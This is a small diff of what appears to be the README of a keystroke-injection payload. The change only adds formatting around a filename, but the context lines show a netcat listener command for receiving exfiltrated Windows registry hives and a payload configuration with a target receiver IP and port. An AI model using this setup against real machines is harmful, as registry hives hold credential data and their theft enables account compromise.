@@ -32,7 +32,7 @@ Start your listener on the receiver host to capture incoming hive data:
 nc -lvnp 4444 > registry_hives.tar.gz
 ```
 
-Configure target parameters in payload.txt:
+Configure target parameters in `payload.txt`:
 
 ```
 REM Target Receiver IP and Port
